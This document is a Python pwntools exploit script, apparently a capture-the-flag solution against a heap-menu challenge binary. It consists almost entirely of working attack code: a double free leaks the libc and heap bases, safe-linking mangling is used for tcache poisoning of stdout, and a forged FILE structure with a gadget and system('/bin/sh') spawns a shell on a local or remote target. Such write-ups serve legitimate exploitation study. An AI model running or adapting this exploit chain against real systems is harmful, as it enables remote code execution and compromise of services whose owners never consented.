
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from time import sleep
context.update(arch="amd64", os="linux")
context.log_level = 'info'

context.log_level = 'debug'
exe = context.binary = ELF('./prob', checksec=False)
libc = ELF('./libc.so.6')
ld = './ld-linux-x86-64.so.2'
def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l0', filename]).decode().split(' ')]

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.p.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())

def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)

def start(argv=[], *a, **kw):
    
    if args.GDB:
         env = {"LD_PRELOAD": libc.path}
         argv = [ld, "--library-path", ".", exe.path] + argv
         return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.ARM:
        return process(['qemu-arm', '-g', '1234', '-L', '/usr/arm-linux-gnueabihf', exe.path])
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
brva 0x000000000000139B
brva 0x00000000000013D8
brva 0x0000000000001422
brva 0x00000000000015F5
brva 0x0000000000001764
brva 0x0000000000001865
c
'''.format(**locals())

# ==================== EXPLOIT ====================

def cmd(choice):
    sla(b'> ',str(choice).encode())

def add(idx,name_size,name,content):
    cmd(1)
    sla(b'idx > ',str(idx).encode())
    sla(b'name size > ',str(name_size).encode())
    sa(b'name > ',name)
    sa(b'content > ',content)

def delete(idx):
    cmd(2)
    sla(b'idx > ',str(idx).encode())

def edit(idx,name,content):
    cmd(3)   
    sla(b'idx > ',str(idx).encode())
    sa(b'name > ',name)
    sa(b'content > ',content)

def show(idx):
    cmd(4)
    sla(b'idx > ',str(idx).encode())

def mangled_ptr(heap,target):
    return (heap>>12) ^ target

def init():
    global p

    p = start()

def exploit():
    add(0,0x500,b'a',b'a')
    add(1,0x50,b'a',b'a')
    add(2,0x50,b'a',b'a')
    add(3,0x20,b'a',b'a')
    delete(0)
    delete(0)
    show(0)
    p.recvuntil(b'name : ')
    libc.address = u64(p.recv(6).ljust(8,b'\x00')) - 0x21ace0
    logbase()
    delete(2)
    delete(1)
    delete(2)
    show(2)
    p.recvuntil(b'name : ')
    heap_base = u64(p.recv(5).ljust(8,b'\x00')) * 0x1000
    info(f'heap base: {hex(heap_base)}')
    delete(1)
    target = mangled_ptr(heap_base,libc.address + 0x21b780)
    input()
    edit(1,p64(target),p64(target))

    stdout_lock = libc.sym["_IO_stdfile_1_lock"]   # _IO_stdfile_1_lock  (symbol not exported)
    stdout = libc.address + 0x21b780
    fake_vtable = libc.sym['_IO_wfile_jumps']-0x18
    # our gadget
    gadget = libc.address + 0x00000000001636a0 # add rdi, 0x10 ; jmp rcx

    fake = FileStructure(0)
    fake.flags = 0x3b01010101010101
    fake._IO_read_end=libc.sym['system']            # the function that we will call: system()
    fake._IO_save_base = gadget
    fake._IO_write_end=u64(b'/bin/sh\x00')  # will be at rdi+0x10
    fake._lock=stdout_lock
    fake._codecvt= stdout + 0xb8
    fake._wide_data = stdout+0x200          # _wide_data just need to points to empty zone
    fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)

    add(4,0x50,b'a',b'a')

    add(5,0x50,b'a',bytes(fake))


    p.interactive()

if __name__ == '__main__':
    init()
    exploit()